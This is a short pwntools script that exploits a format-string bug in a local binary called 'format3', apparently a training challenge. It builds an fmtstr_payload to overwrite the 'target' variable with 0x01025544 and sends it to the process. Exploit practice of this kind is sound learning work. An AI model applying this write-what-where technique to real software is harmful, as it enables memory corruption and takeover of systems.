from pwn import *
import time

p = process('./format3')
e = ELF('./format3')
target_addr = e.symbols['target'] # 0x00020718

# Creating Payload
#payload = fmtstr_payload(8,{target_addr:0x01025544} ,write_size='int')   # len : 20, too long time
#payload = fmtstr_payload(8,{target_addr:0x01025544} ,write_size='short') # len : 36, long time
payload = fmtstr_payload(8,{target_addr:0x01025544} ,write_size='byte')   # len : 44, fastest

print("payload len : {}".format(len(payload)))
print("paylaod     : {}".format(payload))

# Sending Payload
print("[+] Sending payload..")
p.sendline(payload)
sleep(1)

print(p.recvline())
